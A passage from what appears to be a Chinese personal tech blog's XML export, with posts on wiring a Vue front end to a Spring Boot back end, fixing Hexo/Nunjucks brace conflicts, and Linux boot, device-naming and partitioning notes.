title="小后端例子（整合VUE）"></a>小后端例子（整合VUE）</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>安装node.js和vue-cli</p><p>首先创建一个项目文件夹将Java项目和vue项目分两个文件存放.</p><h2 id="VUE部分"><a href="#VUE部分" class="headerlink" title="VUE部分"></a>VUE部分</h2><p><a href="https://cli.vuejs.org/zh/guide/installation.html%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8vue-cli%E6%90%AD%E5%BB%BA%E9%A1%B9%E7%9B%AE">https://cli.vuejs.org/zh/guide/installation.html然后使用vue-cli搭建项目</a></p><h4 id="跨域问题放到文件vue-config-js"><a href="#跨域问题放到文件vue-config-js" class="headerlink" title="跨域问题放到文件vue.config.js"></a>跨域问题放到文件vue.config.js</h4><p>文件路径为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 跨域配置</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">devServer</span>: &#123;                <span class="hljs-comment">//记住，别写错了devServer//设置本地默认端口  选填</span><br>        <span class="hljs-attr">port</span>: <span class="hljs-number">8002</span>,<br>        <span class="hljs-attr">proxy</span>: &#123;                 <span class="hljs-comment">//设置代理，必须填</span><br>            <span class="hljs-string">&#x27;/api&#x27;</span>: &#123;              <span class="hljs-comment">//设置拦截器  拦截器格式   斜杠+拦截器名字，名字可以自己定</span><br>                <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://localhost:8001&#x27;</span>,     <span class="hljs-comment">//代理的目标地址</span><br>                <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,              <span class="hljs-comment">//是否设置同源，输入是的</span><br>                <span class="hljs-attr">pathRewrite</span>: &#123;                   <span class="hljs-comment">//路径重写</span><br>                    <span class="hljs-string">&#x27;/api&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>                     <span class="hljs-comment">//选择忽略拦截器里面的单词</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="request-js用来进行请求或者响应的处理"><a href="#request-js用来进行请求或者响应的处理" class="headerlink" title="request.js用来进行请求或者响应的处理"></a>request.js用来进行请求或者响应的处理</h4><p>只有在用request进行请求时才进行处理页面跳转不进行处理</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span><br><span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;../src/router&quot;</span>;<br><br><span class="hljs-keyword">const</span> request = axios.<span class="hljs-title function_">create</span>(&#123;<br>    <span class="hljs-attr">baseURL</span>:<span class="hljs-string">&quot;/api&quot;</span>,<br>    <span class="hljs-attr">timeout</span>: <span class="hljs-number">5000</span><br>&#125;)<br><br><span class="hljs-comment">// request 拦截器</span><br><span class="hljs-comment">// 可以自请求发送前对请求做一些处理</span><br><span class="hljs-comment">// 比如统一加token，对请求参数统一加密</span><br>request.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function"><span class="hljs-params">config</span> =&gt;</span> &#123;<br>    config.<span class="hljs-property">headers</span>[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;application/json;charset=utf-8&#x27;</span>;<br>    <span class="hljs-comment">// let user = sessionStorage.getItem(&quot;user&quot;);</span><br>    <span class="hljs-comment">// console.error(config);</span><br>    <span class="hljs-comment">// if(!user &amp;&amp; router.path !=&quot;/register&quot;)&#123;</span><br>    <span class="hljs-comment">//     router.push(&quot;/login&quot;);</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// config.headers[&#x27;token&#x27;] = user.token;  // 设置请求头</span><br>    <span class="hljs-keyword">return</span> config<br>&#125;, <span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)<br>&#125;);<br><br><span class="hljs-comment">// response 拦截器</span><br><span class="hljs-comment">// 可以在接口响应后统一处理结果</span><br>request.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(<br>    <span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;1111&quot;</span>);<br>        <span class="hljs-keyword">let</span> res = response.<span class="hljs-property">data</span>;<br>        <span class="hljs-comment">// 如果是返回的文件</span><br>        <span class="hljs-keyword">if</span> (response.<span class="hljs-property">config</span>.<span class="hljs-property">responseType</span> === <span class="hljs-string">&#x27;blob&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> res<br>        &#125;<br>        <span class="hljs-comment">// 兼容服务端返回的字符串数据</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> res === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;<br>            res = res ? <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(res) : res<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;,<br>    <span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;err&#x27;</span> + error) <span class="hljs-comment">// for debug</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)<br>    &#125;<br>)<br><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> request<br></code></pre></td></tr></table></figure><h4 id="关于Element插件"><a href="#关于Element插件" class="headerlink" title="关于Element插件"></a>关于Element插件</h4><p>高版本的VUE引入ElementPlus</p><p>低版本直接引入ElementUI即可</p><h4 id="对于APP-vue文件"><a href="#对于APP-vue文件" class="headerlink" title="对于APP.vue文件"></a>对于APP.vue文件</h4><p>一般只有一个这个</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;router-view&gt;</span><span class="hljs-section">&lt;/router-view&gt;</span><br></code></pre></td></tr></table></figure><h4 id="关于路由的vue文件"><a href="#关于路由的vue文件" class="headerlink" title="关于路由的vue文件"></a>关于路由的vue文件</h4><h5 id="首先是正常的路由"><a href="#首先是正常的路由" class="headerlink" title="首先是正常的路由"></a>首先是正常的路由</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> routes = [<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>,<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Layout&#x27;</span>,<br>    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Layout</span>,<br>    <span class="hljs-attr">redirect</span>:<span class="hljs-string">&quot;/user&quot;</span>,<br>    <span class="hljs-attr">meta</span>: &#123;<br>      <span class="hljs-attr">requireAuth</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// 配置此条，进入页面前判断是否需要登陆</span><br>    &#125;,<br>    <span class="hljs-attr">children</span>:[<br>      &#123;<br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/user&#x27;</span>,<br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;User&#x27;</span>,<br>        <span class="hljs-attr">component</span>: <span class="hljs-title class_">User</span>,<br>      &#125;,&#123;<br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/person&#x27;</span>,<br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Person&#x27;</span>,<br>        <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;about&quot; */</span> <span class="hljs-string">&#x27;../views/Person.vue&#x27;</span>),<br>      &#125;,&#123;<br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/about&#x27;</span>,<br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;About&#x27;</span>,<br>        <span class="hljs-comment">// route level code-splitting</span><br>        <span class="hljs-comment">// this generates a separate chunk (about.[hash].js) for this route</span><br>        <span class="hljs-comment">// which is lazy-loaded when the route is visited.</span><br>        <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;about&quot; */</span> <span class="hljs-string">&#x27;../views/About.vue&#x27;</span>)<br>      &#125;<br>    ]<br>  &#125;,<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/login&#x27;</span>,<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Login&#x27;</span>,<br>    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Login</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/register&#x27;</span>,<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Register&#x27;</span>,<br>    <span class="hljs-attr">component</span>: <span class="hljs-function">()=&gt;</span><span class="hljs-title function_">import</span>(<span class="hljs-string">&#x27;../views/Register.vue&#x27;</span>)<br>  &#125;,<br><br>]<br></code></pre></td></tr></table></figure><p>每一个对象变是一条路由</p><p>但是对于children内的路由一般展示在上层的<router-view></router-view>中</p><p>在上面这种带有children一般如下格式有着公共模块,有着展示区域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>    &lt;div&gt;<br>        &lt;Header/&gt;<br><br>        &lt;div style=&quot;display: flex;&quot;&gt;<br>            &lt;Aside/&gt;<br>            &lt;router-view style=&quot;flex: 1&quot;&gt;&lt;/router-view&gt;<br><br>        &lt;/div&gt;<br>    &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>    import Header from &quot;../components/Header&quot;;<br>    import Aside from &quot;../components/Aside&quot;;<br><br>    export default &#123;<br>        name: &quot;Layout&quot;,<br>        components:&#123;<br>            Header,<br>            Aside<br>        &#125;,<br>    &#125;<br>&lt;/script&gt;<br><br>&lt;style scoped&gt;<br><br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><h5 id="授权认证"><a href="#授权认证" class="headerlink" title="授权认证"></a>授权认证</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">requireAuth</span>) &#123; <span class="hljs-comment">// 判断该路由是否需要登录权限</span><br>    <span class="hljs-keyword">if</span> (sessionStorage.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&quot;user&quot;</span>)!=<span class="hljs-literal">null</span> ) &#123; <span class="hljs-comment">// 通过vuex state获取当前的userid是否存在</span><br>      <span class="hljs-title function_">next</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-title function_">next</span>(&#123;<br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/login&#x27;</span>,<br>        <span class="hljs-comment">// query: &#123; redirect: to.fullPath &#125; // 将跳转的路由path作为参数，登录成功后跳转到该路由</span><br>      &#125;)<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_">next</span>();<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><h4 id="页面跳转"><a href="#页面跳转" class="headerlink" title="页面跳转"></a>页面跳转</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">&quot;/login&quot;</span>);<br></code></pre></td></tr></table></figure><p>vue文件的函数中一般使用这种方法</p><p>在js文件中一般采用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">push</span>(<span class="hljs-string">&quot;/login&quot;</span>);<br></code></pre></td></tr></table></figure><p>然后按alt+enter引入router</p><h2 id="Java部分"><a href="#Java部分" class="headerlink" title="Java部分"></a>Java部分</h2><p>comment部分</p><p>跨域问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CorsConfig</span> &#123;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> WebMvcConfigurer <span class="hljs-title function_">corsConfigurer</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebMvcConfigurer</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCorsMappings</span><span class="hljs-params">(CorsRegistry registry)</span> &#123;<br>                registry.addMapping(<span class="hljs-string">&quot;/**&quot;</span>)<br>                        .allowedHeaders(<span class="hljs-string">&quot;*&quot;</span>)<br>                        .allowedMethods(<span class="hljs-string">&quot;*&quot;</span>)<br>                        .allowedOrigins(<span class="hljs-string">&quot;*&quot;</span>);<br>            &#125;<br>        &#125;;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>mybatis-plus的配置文件(分页插件)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@MapperScan(&quot;com.yh.mapper&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisPlusConfig</span> &#123;<br>    <span class="hljs-comment">// 最新版</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">mybatisPlusInterceptor</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();<br>        interceptor.addInnerInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PaginationInnerInterceptor</span>(DbType.MYSQL));<br>        <span class="hljs-keyword">return</span> interceptor;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同一的返回数据格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@Accessors(chain = true)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Result</span>&lt;T&gt; &#123;<br><br>    <span class="hljs-keyword">private</span> String msg;<br>    <span class="hljs-keyword">private</span> String code;<br>    <span class="hljs-keyword">private</span> T data;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Result</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Result</span><span class="hljs-params">(T data)</span> &#123;<br>        <span class="hljs-built_in">this</span>.data = data;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Result <span class="hljs-title function_">success</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">Result</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Result</span>();<br>        result.code=<span class="hljs-string">&quot;0&quot;</span>;<br>        result.msg=<span class="hljs-string">&quot;success&quot;</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; Result&lt;T&gt; <span class="hljs-title function_">success</span><span class="hljs-params">(T data)</span>&#123;<br>        <span class="hljs-type">Result</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Result</span>&lt;&gt;(data);<br>        result.code=<span class="hljs-string">&quot;0&quot;</span>;<br>        result.msg=<span class="hljs-string">&quot;success&quot;</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Result <span class="hljs-title function_">error</span><span class="hljs-params">(String msg,String code)</span>&#123;<br>        Result&lt;Object&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Result</span>&lt;&gt;();<br>        result.msg=msg;<br>        result.code=code;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Spring开发随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>后端</tag>
      
      <tag>Java</tag>
      
      <tag>Spring</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo和MD冲突问题</title>
    <link href="/2022/01/09/Hexo%E5%92%8CMD%E5%86%B2%E7%AA%81%E9%97%AE%E9%A2%98/"/>
    <url>/2022/01/09/Hexo%E5%92%8CMD%E5%86%B2%E7%AA%81%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">有时候我们在写文章的时候会用到&#123;&#123;&#125;&#125;或者&#123;##&#125;这种标识符,但是在Hexo使用的是Nunjucks进行渲染,这些都是特殊用法<br><br></code></pre></td></tr></table></figure><h3 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h3><p><code>根据报错为止将文章中的&#123;&#123;&#125;&#125;或者进行修改,或者不要被 </code></p><blockquote><p>```包裹</p></blockquote><h3 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h3><p>对含有这些特殊字符的首位根据下面的例子添加代码</p><blockquote><p><code>`>>`{{ 包裹的内容 }}`>>`</code></p></blockquote><h3 id="第三种方法"><a href="#第三种方法" class="headerlink" title="第三种方法"></a>第三种方法</h3><blockquote><p>node_modules&#x2F;nunjucks&#x2F;src&#x2F;lexer.js</p></blockquote><p>在这个文件夹下将,这种东西进行修改</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">var</span> VARIABLE_START = <span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>;<br><span class="hljs-keyword">var</span> VARIABLE_END = <span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><blockquote><p>但是你要是修改了这些,有一些功能可能就使用不了了,比如新建文章时的title,data什么的都是object null</p><p>需要修改\scaffolds文件夹下面的文件</p></blockquote><p>而且如果使用npm install进行更新那么这个文件可能被更改回来这样你要还重新改</p>]]></content>
    
    
    
    <tags>
      
      <tag>Blog</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux</title>
    <link href="/2022/01/09/Linux/"/>
    <url>/2022/01/09/Linux/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="系统启动"><a href="#系统启动" class="headerlink" title="系统启动"></a>系统启动</h2><p>从RBM读取Boot Loader然后进行3个启动选择，再选择不同的boot loader来加载内核</p><blockquote><p>但是！因为Winodws的loader不具有控制权转交的功能，即不能使用windows的loader来加载Linux的loader！所以需要先装windows在装linux。这样MBR里面，先装的windows的loader才会被后装的Linux的boot loader所覆盖，使用Linux的loader的选单功能，才能够启动双系统</p><p>所以安装双系统的时候先安装Windows再安装Linux</p></blockquote><p>如果Linux的boot loader获取控制权，进而会将内核根据boot loader加载到内存再对硬件设备进行再一次检测，一般内核文件放在&#x2F;boot&#x2F;vmlinuz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH boot]<span class="hljs-comment"># ls --format=single-column -F</span><br>config-3.10.0-1160.11.1.el7.x86_64<span class="hljs-comment">#此版本内核被编译时选择功能与模块的配置文件</span><br>efi/<br>grub/<span class="hljs-comment">#旧版grub</span><br>grub2/<span class="hljs-comment">#启动程序相关目录</span><br>initramfs-0-rescue-3a6d3fd1db2b4ab6983389e8c068011e.img<span class="hljs-comment">#用来恢复的</span><br>initramfs-3.10.0-1160.11.1.el7.x86_64.img<span class="hljs-comment">#正常启动会用到的</span><br>initramfs-3.10.0-1160.11.1.el7.x86_64kdump.img<span class="hljs-comment">#内核出问题时用到</span><br>symvers-3.10.0-1160.11.1.el7.x86_64.gz<br>System.map-3.10.0-1160.11.1.el7.x86_64<span class="hljs-comment">#内核功能放置到内存地址的对应表</span><br>vmlinuz-0-rescue-3a6d3fd1db2b4ab6983389e8c068011e*<span class="hljs-comment">#恢复用的内核文件</span><br>vmlinuz-3.10.0-1160.11.1.el7.x86_64*<span class="hljs-comment">#内核文件</span><br></code></pre></td></tr></table></figure><p>Linux内核可以通过动态加载内核模块,这些内核放在&#x2F;lib&#x2F;modules目录&#x3D;&#x3D;不可与内核放在不同的硬盘分区&#x3D;&#x3D;</p><blockquote><p>如果你使用SATA但是内核不认识SATA，所以需要SATA磁盘的驱动否则无法使用但是SATA放在&#x2F;lib&#x2F;modules内,所以根本无法获取驱动,这时就要用到虚拟文件系统</p><p>这个一般是一个文件,可以被boot loader来加载到内存中而这个文件再内存中会被模拟成一个跟目录,这些一般都是磁盘的驱动程序</p><p>文件名通常为&#x2F;boot&#x2F;initrd或&#x2F;boot&#x2F;initramfs</p><p>详细内容可以使用man initrd来查看</p><p>lsinitrd &#x2F;boot&#x2F;initramfs-3.10.0-1160.11.1.el7.x86_64.img查看文件内容</p></blockquote><h2 id="各种设备在linux的文件名"><a href="#各种设备在linux的文件名" class="headerlink" title="各种设备在linux的文件名"></a>各种设备在linux的文件名</h2><p><img src="https://img-blog.csdnimg.cn/20190226160828364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpdV9zaXNp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>在上图中的[a-p]表示从a字母到p字母的罗列例如，&#x2F;dev&#x2F;sda &#x2F;dev&#x2F;sdb ….. &#x2F;dev&#x2F;sdp</p><p>注意以后会有很多[]</p></blockquote><h2 id="Linux安装与设置"><a href="#Linux安装与设置" class="headerlink" title="Linux安装与设置"></a>Linux安装与设置</h2><h4 id="GPT分区表和MBR分区表的区别"><a href="#GPT分区表和MBR分区表的区别" class="headerlink" title="GPT分区表和MBR分区表的区别"></a>GPT分区表和MBR分区表的区别</h4><p><a href="http://www.360doc.com/content/18/0614/22/6140124_762487520.shtml">http://www.360doc.com/content/18/0614/22/6140124_762487520.shtml</a></p><h4 id="挂载的含义"><a href="#挂载的含义" class="headerlink" title="挂载的含义"></a>挂载的含义</h4><blockquote><p>将真实的存储设备与对应的文件进行绑定即为挂载，所在的目录即为挂载点</p><p>文件系统与目录树结合的操作我们称为[挂载]</p></blockquote><h3 id="安装模式与启动"><a href="#安装模式与启动" class="headerlink" title="安装模式与启动"></a>安装模式与启动</h3><blockquote><p>如果磁盘容量小于2TB的话，系统默认会使用MBR分区表来安装</p></blockquote><h4 id="初次安装建议"><a href="#初次安装建议" class="headerlink" title="初次安装建议"></a>初次安装建议</h4><ul><li>建议一,只划分”&#x2F;“以及”交换分区”</li><li>建议二,预留一个备份的剩余磁盘容量</li><li>建议三,选择Linux安装程序提供的默认硬盘分区方式</li><li>建议四,使用usb3.0时可能会将该设备识别为硬盘,设置启动项时一定要注意.</li><li>建议五,如果硬盘大小小于2TB默认采用MBR分区</li><li>建议六,如果没有采用MBR而是采用GPT则需要创建bios boot分区</li><li>如果不想安装下载文件可以选择LiveCD等Live系列</li><li>如果想练习可使用最小安装版本(minimal)来安装</li></ul><h4 id="关于centos名称解读"><a href="#关于centos名称解读" class="headerlink" 